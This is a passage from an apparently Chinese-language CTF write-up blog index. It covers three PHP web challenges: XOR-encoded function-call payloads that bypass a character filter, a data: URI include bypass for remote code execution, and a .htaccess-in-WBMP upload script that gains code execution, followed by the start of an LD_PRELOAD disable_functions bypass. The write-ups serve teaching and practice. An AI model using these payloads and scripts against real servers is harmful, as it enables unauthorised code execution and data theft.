a=%s&quot;</span>%(i,p,a))</span><br></pre></td></tr></table></figure>\r\n<p>暴力搜索符合条件的字符串，例如：phpinfo==%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff。</p>\r\n<img src=\"/2019/07/18/ISITDTU-Easy-PHP/Example-phpinfo.png\" class=\"\" title=\"Example of phpinfo\">\r\n<p>从phpinfo返回中可以看到所有命令执行的函数都被ban了，加上mail和imap_mail。同时也限制了open_basedir在/var/www/html。下一步是找flag文件。我们可以用scandir或者glob列目录，但它返回一个数组，我们还需要一个print_r或var_dump。</p>\r\n<p>即目标为<code>print_r(scandir('.'));==((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</code>。发现可以运行，但是count_chars那里过不去，我们一共用了16个不同字符，下一步是缩减字符数。我采用一种粗暴的方法： <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">result2 = [<span class=\"number\">0x8b</span>, <span class=\"number\">0x9b</span>, <span class=\"number\">0xa0</span>, <span class=\"number\">0x9c</span>, <span class=\"number\">0x8f</span>, <span class=\"number\">0x91</span>, <span class=\"number\">0x9e</span>, <span class=\"number\">0xd1</span>, <span class=\"number\">0x96</span>, <span class=\"number\">0x8d</span>, <span class=\"number\">0x8c</span>]  <span class=\"comment\"># Original chars,11 total</span></span><br><span class=\"line\">result = [<span class=\"number\">0x9b</span>, <span class=\"number\">0xa0</span>, <span class=\"number\">0x9c</span>, <span class=\"number\">0x8f</span>, <span class=\"number\">0x9e</span>, <span class=\"number\">0xd1</span>, <span class=\"number\">0x96</span>, <span class=\"number\">0x8c</span>]  <span class=\"comment\"># to be deleted</span></span><br><span class=\"line\">temp = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> d <span class=\"keyword\">in</span> result2:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> result:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> result:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> result:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (a ^ b ^ c == d):</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> a == b == c == d:</span><br><span class=\"line\">                        <span class=\"keyword\">continue</span></span><br><span class=\"line\">                    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                        print(<span class=\"string\">&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot;</span> % (a, b, c, d))</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> d <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> temp:</span><br><span class=\"line\">                            temp.append(d)</span><br><span class=\"line\">print(len(temp), temp)</span><br></pre></td></tr></table></figure></p>\r\n<p>除了必要的<code>()^;</code>以外，我们最多剩余9个字符的空间，逐步删除result里的值，当结果仍能保持11个，就意味着我们可以继续删除了。</p>\r\n<p>所以我们整理结果：print_r(scandir(.));==((%9b%9c%9b%9b%9b%9b%9c)<sup>(%9b%8f%9b%9c%9c%9b%8f)</sup>(%8f%9e%96%96%8c%a0%9e)<sup>(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)</sup>(%9b%9b%9b%9c%a0%9b%8f)<sup>(%8c%9c%9e%96%a0%96%9e)</sup>(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</p>\r\n<img src=\"/2019/07/18/ISITDTU-Easy-PHP/Success-encode.png\" class=\"\" title=\"Success payload\">\r\n<p>可以发现当前目录下有一个 n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt文件，我们尝试直接打开。403，行吧。那么我们接着读文件。scandir返回的是个数组，且刚才的结果显示我们要找的文件在scandir的结果最后面，那么用end()方法就可以得到文件名了。读文件可以用show_source或者readfile。</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">result2 = [<span class=\"number\">160</span>, <span class=\"number\">136</span>, <span class=\"number\">138</span>, <span class=\"number\">140</span>, <span class=\"number\">141</span>, <span class=\"number\">144</span>, <span class=\"number\">145</span>, <span class=\"number\">209</span>, <span class=\"number\">150</span>, <span class=\"number\">151</span>, <span class=\"number\">154</span>, <span class=\"number\">155</span>, <span class=\"number\">156</span>, <span class=\"number\">158</span>]  <span class=\"comment\"># Original chars,14 total</span></span><br><span class=\"line\">result = [<span class=\"number\">160</span>, <span class=\"number\">136</span>, <span class=\"number\">141</span>, <span class=\"number\">209</span>, <span class=\"number\">151</span>, <span class=\"number\">154</span>, <span class=\"number\">155</span>, <span class=\"number\">156</span>]</span><br><span class=\"line\">temp = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> d <span class=\"keyword\">in</span> result2:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> result:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> result:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> result:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (a ^ b ^ c == d):</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (a == b == c == d) <span class=\"keyword\">or</span> (a==b) <span class=\"keyword\">or</span> (b==c) <span class=\"keyword\">or</span> (c==d) <span class=\"keyword\">or</span>(a==c):</span><br><span class=\"line\">                        <span class=\"keyword\">continue</span></span><br><span class=\"line\">                    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                        print(<span class=\"string\">&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot;</span> % (a, b, c, d))</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> d <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> temp:</span><br><span class=\"line\">                            temp.append(d)</span><br><span class=\"line\">print(len(temp), temp)</span><br></pre></td></tr></table></figure>\r\n<p>Payload:show_source(end(scandir(.)));==((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</p>\r\n<img src=\"/2019/07/18/ISITDTU-Easy-PHP/Final.png\" class=\"\" title=\"final payload\">\r\n\n    <div id=\"aplayer-YtwHQQRA\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"25295034\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{e5b1ade2-294f-4422-a8c9-1467233ba6b5}</p>\r\n","categories":["Writeups"],"tags":["PHP","Web","Regex"]},{"title":"Insomni-hack-teaser-2019-Phuck2","url":"/2019/05/15/Insomni-hack-teaser-2019-Phuck2/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>今天继续学习 PHP 知识。Insomni hacker’s teaser 2019 的 Phuck2，题目比较简单，顺便学习了一下 <a href=\"https://en.wikipedia.org/wiki/Data_URI_scheme\">Data URI Scheme</a>。环境在这里。 <a id=\"more\"></a> <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    stream_wrapper_unregister(<span class=\"string\">&#x27;php&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">&#x27;hl&#x27;</span>])) highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    $mkdir = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">$dir</span>) </span>&#123;</span><br><span class=\"line\">        system(<span class=\"string\">&#x27;mkdir -- &#x27;</span>.escapeshellarg($dir));</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    $randFolder = bin2hex(random_bytes(<span class=\"number\">16</span>));</span><br><span class=\"line\">    $mkdir(<span class=\"string\">&#x27;users/&#x27;</span>.$randFolder);</span><br><span class=\"line\">    chdir(<span class=\"string\">&#x27;users/&#x27;</span>.$randFolder);</span><br><span class=\"line\">    </span><br><span class=\"line\">    $userFolder = (<span class=\"keyword\">isset</span>($_SERVER[<span class=\"string\">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) ? $_SERVER[<span class=\"string\">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] : $_SERVER[<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class=\"line\">    $userFolder = basename(str_replace([<span class=\"string\">&#x27;.&#x27;</span>,<span class=\"string\">&#x27;-&#x27;</span>],[<span class=\"string\">&#x27;&#x27;</span>,<span class=\"string\">&#x27;&#x27;</span>],$userFolder));</span><br><span class=\"line\">    </span><br><span class=\"line\">    $mkdir($userFolder);</span><br><span class=\"line\">    chdir($userFolder);</span><br><span class=\"line\">    file_put_contents(<span class=\"string\">&#x27;profile&#x27;</span>,print_r($_SERVER,<span class=\"literal\">true</span>));</span><br><span class=\"line\">    chdir(<span class=\"string\">&#x27;..&#x27;</span>);</span><br><span class=\"line\">    $_GET[<span class=\"string\">&#x27;page&#x27;</span>]=str_replace(<span class=\"string\">&#x27;.&#x27;</span>,<span class=\"string\">&#x27;&#x27;</span>,$_GET[<span class=\"string\">&#x27;page&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!stripos(file_get_contents($_GET[<span class=\"string\">&#x27;page&#x27;</span>]),<span class=\"string\">&#x27;&lt;?&#x27;</span>) &amp;&amp; !stripos(file_get_contents($_GET[<span class=\"string\">&#x27;page&#x27;</span>]),<span class=\"string\">&#x27;php&#x27;</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>($_GET[<span class=\"string\">&#x27;page&#x27;</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    chdir(<span class=\"keyword\">__DIR__</span>);</span><br><span class=\"line\">    system(<span class=\"string\">&#x27;rm -rf users/&#x27;</span>.$randFolder);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure></p>\r\n<p>上来先 ban 了 php 流，猜一下是文件包含的题。$mkdir 函数用的 system 函数调用 mkdir 命令，看起来有搞头，但是后面的 escapeshellarg 没法绕，暂时作罢。每个用户新建独立目录并切进去。下面的 $userFolder 开始有趣了，从 X-Forwarded-For 头里拿目录名字作为 userFolder，并且过滤<code>.</code> 和 <code>-</code> 这两个符号。file_put_contents 令人眼前一亮，把 $_SERVER 的所有数据写到 userFolder/profile 里，并且完全没有过滤，那么我们随便捏造一个 HTTP 头，传入任意 PHP 代码，可以造成 RCE。而后面的 include 印证了我们的想法。但是 include 的内容有点问题，不能出现 <code>&lt;?</code> 和 <code>php</code>，因此我们没办法直接传 page=XXX/profile。后面给出的 phpinfo.php 提示我们 allow_url_fopen 为 On，而 allow_url_include 为 Off，就没有办法直接传了。</p>\r\n<p>  后来发现 include 与 file_get_contents 在关于 Data URI 处理问题上的问题。include () 与 file_get_contents () 支持 data:，注意不是 data:// 流，是 <code>data:text/vnd-example+xyz;foo=bar;base64,R0lGODdh</code> 这种东西。Data URI 在网页中其实经常见到，<code>data:image/jpeg;base64,XXXXX</code> 经常内嵌在网页中直接传输图片。话说回来，file_get_contents 与 include 在处理 <code>data:,</code> 时具有某些奇怪的特性。</p>\r\n<img src=\"/2019/05/15/Insomni-hack-teaser-2019-Phuck2/data_uri_1.png\" class=\"\" title=\"Data URI 1\">\r\n<img src=\"/2019/05/15/Insomni-hack-teaser-2019-Phuck2/data_uri_2.png\" class=\"\" title=\"Data URI 2\">\r\n<p>file_get_contents 允许使用 data URI，会直接返回后面的内容，很奇怪的是，在 allow_url_include=Off 的情况下，不允许 include data URI 的，但是如果 <code>data:,XXX</code> 是一个目录名的话，就会放开限制。所以使用这个绕过。</p>\r\n<img src=\"/2019/05/15/Insomni-hack-teaser-2019-Phuck2/exp.png\" class=\"\" title=\"Exploit it!\">\r\n\n    <div id=\"aplayer-vOWSxSGj\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"22722555\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{d12dce31-43b4-45ef-8bed-ddede1045228}</p>\r\n","categories":["Writeups"],"tags":["Web","Data URI Scheme"]},{"title":"Insomni-hack-teaser-2019-l33-hoster","url":"/2019/05/15/Insomni-hack-teaser-2019-l33-hoster/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>脱产半年，重新回顾一遍基本都不会的 Web，反正得准备考试，顺便了。Insomni hacker’s teaser 这个比赛之前有听说过，没想到这么难。就 4 个 Web，做出的人还都不多。l33t-hoster 这题看起来最简单，就是他了。这题我环境做完了，地址<a href=\"https://github.com/CTFTraining/insomniteaser_2019_l33t_hoster/\">后面</a>贴。 <a id=\"more\"></a> # Part 1. .htaccess 上传 + getshell</p>\r\n<p>  这个题打开后是个上传页面，猜一下是上传 PHP 文件，getshell，读 flag。F12 后发现提示有 source。那就看一下源码吧。   <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">  <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">&quot;source&quot;</span>])) </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(highlight_file(<span class=\"keyword\">__FILE__</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">session_start();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($_SESSION[<span class=\"string\">&quot;home&quot;</span>])) &#123;</span><br><span class=\"line\">    $_SESSION[<span class=\"string\">&quot;home&quot;</span>] = bin2hex(random_bytes(<span class=\"number\">20</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$userdir = <span class=\"string\">&quot;images/&#123;$_SESSION[&quot;</span>home<span class=\"string\">&quot;]&#125;/&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!file_exists($userdir)) &#123;</span><br><span class=\"line\">    mkdir($userdir);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$disallowed_ext = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">    <span class=\"string\">&quot;php&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;php3&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;php4&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;php5&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;php7&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;pht&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;phtm&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;phtml&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;phar&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;phps&quot;</span>,</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&quot;upload&quot;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($_FILES[<span class=\"string\">&#x27;image&#x27;</span>][<span class=\"string\">&#x27;error&#x27;</span>] !== UPLOAD_ERR_OK) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;yuuuge fail&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $tmp_name = $_FILES[<span class=\"string\">&quot;image&quot;</span>][<span class=\"string\">&quot;tmp_name&quot;</span>];</span><br><span class=\"line\">    $name = $_FILES[<span class=\"string\">&quot;image&quot;</span>][<span class=\"string\">&quot;name&quot;</span>];</span><br><span class=\"line\">    $parts = explode(<span class=\"string\">&quot;.&quot;</span>, $name);</span><br><span class=\"line\">    $ext = array_pop($parts);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">empty</span>($parts[<span class=\"number\">0</span>])) &#123;</span><br><span class=\"line\">        array_shift($parts);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (count($parts) === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;lol filename is empty&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (in_array($ext, $disallowed_ext, <span class=\"literal\">TRUE</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;lol nice try, but im not stupid dude...&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    $image = file_get_contents($tmp_name);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (mb_strpos($image, <span class=\"string\">&quot;&lt;?&quot;</span>) !== <span class=\"literal\">FALSE</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;why would you need php in a pic.....&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!exif_imagetype($tmp_name)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;not an image.&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    $image_size = getimagesize($tmp_name);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($image_size[<span class=\"number\">0</span>] !== <span class=\"number\">1337</span> || $image_size[<span class=\"number\">1</span>] !== <span class=\"number\">1337</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;lol noob, your pic is not l33t enough&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    $name = implode(<span class=\"string\">&quot;.&quot;</span>, $parts);</span><br><span class=\"line\">    move_uploaded_file($tmp_name, $userdir . $name . <span class=\"string\">&quot;.&quot;</span> . $ext);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h3&gt;Your &lt;a href=$userdir&gt;files&lt;/a&gt;:&lt;/h3&gt;&lt;ul&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">foreach</span>(glob($userdir . <span class=\"string\">&quot;*&quot;</span>) <span class=\"keyword\">as</span> $file) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;li&gt;&lt;a href=&#x27;$file&#x27;&gt;$file&lt;/a&gt;&lt;/li&gt;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/ul&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;h1&gt;Upload your pics!&lt;/h1&gt;</span><br><span class=\"line\">&lt;form method=<span class=\"string\">&quot;POST&quot;</span> action=<span class=\"string\">&quot;?&quot;</span> enctype=<span class=\"string\">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class=\"line\">    &lt;input type=<span class=\"string\">&quot;file&quot;</span> name=<span class=\"string\">&quot;image&quot;</span>&gt;</span><br><span class=\"line\">    &lt;input type=<span class=\"string\">&quot;submit&quot;</span> name=upload&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;!-- /?source --&gt;</span><br><span class=\"line\">  </span><br></pre></td></tr></table></figure></p>\r\n<p>摆明了就是要上传 PHP 文件了。上传的文件都会在 images / 随机目录 里存放，其中给了我们如下限制条件：</p>\r\n<ol type=\"1\">\r\n<li>上传的文件名后缀不能是如下之一： “php”,”php3”,”php4”,”php5”,”php7”,”pht”,”phtm”,”phtml”,”phar”,”phps”；</li>\r\n<li>上传的文件不能出现”&lt;?“；</li>\r\n<li>上传的文件得是一个合法的图片文件，还的是 1337*1337 规格的。</li>\r\n</ol>\r\n<p>  第一条把 PHP 引擎默认处理的后缀全处理掉了，第二条规则在 PHP7 之前还是可以用 <code>&lt;script language='php'&gt;&lt;/sciprt&gt;</code> 绕的，但是这个 PHP7 里废除了，第三条倒是好办，找张 1337*1337 尺寸的图片就好办。</p>\r\n<p>  这个时候，为了突破第一条限制，我们就可以上传一个.htaccess 文件了，在开启了 AllowOverride 下，.htaccess 文件可以修改 PHP 能解析的文件后缀。但是，上传.htaccess 文件需要将实际内容放在一个正常图片后面。而正常的 1337*1337 大小的图片里肯定会出现大量无法正常解析的内容。因此我们需要找到一种能够尽量短小精悍的图片格式。翻了一下 <a href=\"http://php.net/manual/en/function.exif-imagetype.php#refsect1-function.exif-imagetype-constants\">exif_imagetype()</a> 的文档，发现 wbmp 格式的文件似乎能够满足要求，它的开头是 ，不影响.htaccess 文件解析。而为了将图片文件影响到最小，我们需要进行压缩。   <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">  <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">$contents = file_get_contents(<span class=\"string\">&quot;../original.wbmp&quot;</span>); <span class=\"comment\">//original,wbmp就是一个非常小的正常wbmp文件</span></span><br><span class=\"line\">$i = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span> (<span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">  $truncated = substr($contents, <span class=\"number\">0</span>, $i);</span><br><span class=\"line\">  file_put_contents(<span class=\"string\">&quot;truncated.wbmp&quot;</span>, $truncated);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (exif_imagetype(<span class=\"string\">&quot;truncated.wbmp&quot;</span>)) <span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  $i += <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;Shortest file size : $i\\n&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">var_dump(exif_imagetype(<span class=\"string\">&quot;truncated.wbmp&quot;</span>));</span><br><span class=\"line\">var_dump(getimagesize(<span class=\"string\">&quot;truncated.wbmp&quot;</span>));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">  </span><br></pre></td></tr></table></figure></p>\r\n<p>从文件末后往前缩小直到文件不再合法为止，最后我们得到一个 6 字节的 wbmp 文件。为了满足 1337*1337 的大小要求，把它拖进 010Editor 里改，最后得到正确的文件。</p>\r\n<img src=\"/2019/05/15/Insomni-hack-teaser-2019-l33-hoster/min_wbmp.png\" class=\"\" title=\"最小的WBMP\">\r\n<p>尝试上传，果然没啥大问题了。注意一点，源码 39-41 行的操作，如果在 aaa.bbb 文件名中 aaa 不存在，就会将.bbb 前移一位，因此需要两个.。</p>\r\n<img src=\"/2019/05/15/Insomni-hack-teaser-2019-l33-hoster/successful_upload.png\" class=\"\" title=\"成功上传.htaccess\">\r\n<p>下面考虑.htaccess 文件需要些什么内容。参考其他.htaccess getshell 的文章，我们可以使用 AddType x-httpd-php .tiaonmmn 这种自定义后缀名来强行使用 PHP 解释器，但是第二条限制我们仍然过不去，不能出现 “&lt;?”。后来知道了，Apache2 配置文件里可以用 php_value 来覆盖 php.ini 的设置，而 php.ini 的设置里有一条比较有趣的条目：auto_append_file，用来在所有 PHP 文件前先行 include 一个文件，以及最重要的一点：auto_append_file 可以使用 PHP 流。那么，我们可以上传两个文件，一个用来写入 shell，而另一个用来触发 shell。而写入的 shell 使用 base64 编码，在.htaccess 中设置 php_value 为 auto_append_file php://filter/convert.base64-decode/resource=”shell 文件名”.tiaonmmn，这样就可以绕过 &lt;? 的限制。</p>\r\n<p>  为了方便起见，我们用一个 Python 脚本简化一下步骤：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">VALID_WBMP = <span class=\"string\">b&quot;\\x00\\x00\\x8a\\x39\\x8a\\x39\\x0a&quot;</span></span><br><span class=\"line\">URL = <span class=\"string\">&quot;http://xxx.yyy.zzz.www/&quot;</span></span><br><span class=\"line\">RANDOM_DIRECTORY = <span class=\"string\">&quot;ad759ad95e5482e02a15c5d30042b588b6630e64&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">COOKIES = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;PHPSESSID&quot;</span> : <span class=\"string\">&quot;0e7eal0ji7seg6ac3ck7d2csd8&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">upload_content</span>(<span class=\"params\">name, content</span>):</span></span><br><span class=\"line\"></span><br><span class=\"line\">    data = &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;image&quot;</span> : (name, content, <span class=\"string\">&#x27;image/png&#x27;</span>),</span><br><span class=\"line\">        <span class=\"string\">&quot;upload&quot;</span> : (<span class=\"literal\">None</span>, <span class=\"string\">&quot;Submit Query&quot;</span>, <span class=\"literal\">None</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    response = requests.post(URL, files=data, cookies=COOKIES)</span><br><span class=\"line\"></span><br><span class=\"line\">HT_ACCESS = VALID_WBMP + <span class=\"string\">b&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">AddType application/x-httpd-php .corb3nik</span></span><br><span class=\"line\"><span class=\"string\">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.corb3nik&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\">TARGET_FILE = VALID_WBMP + <span class=\"string\">b&quot;AA&quot;</span> + base64.b64encode(<span class=\"string\">b&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">&lt;?php</span></span><br><span class=\"line\"><span class=\"string\">  var_dump(&quot;works&quot;);</span></span><br><span class=\"line\"><span class=\"string\">?&gt;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">upload_content(<span class=\"string\">&quot;..htaccess&quot;</span>, HT_ACCESS)</span><br><span class=\"line\">upload_content(<span class=\"string\">&quot;shell.corb3nik&quot;</span>, TARGET_FILE)</span><br><span class=\"line\">upload_content(<span class=\"string\">&quot;trigger.corb3nik&quot;</span>, VALID_WBMP)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">response = requests.post(URL + <span class=\"string\">&quot;/images/&quot;</span> + RANDOM_DIRECTORY + <span class=\"string\">&quot;/trigger.corb3nik&quot;</span>)</span><br><span class=\"line\">print(response.text)</span><br></pre></td></tr></table></figure>\r\n<p> 改 TARGET_FILE 中的 php 代码即可任意执行。</p>\r\n<h1 id=\"part-2.-绕过-disable_functions\">Part 2. 绕过 disable_functions</h1>\r\n<p>  执行一下 phpinfo ()，发现能执行系统命令的函数基本都被禁用了。然后列了一下目录，发现根目录下有一个 flag 文件和一个 get_flag 程序，显然 flag 文件需要 get_flag 命令去读。那么我们就需要执行系统命令。仔细观察 disable_functions，putenv 没有被禁用。目标很明确了：写一个 so 库，利用 mail 函数使用 LD_PRELOAD 变量绕过 disable_functions。</p>\r\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* compile: gcc -Wall -fPIC -shared -o evil.so evil.c -ldl */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> 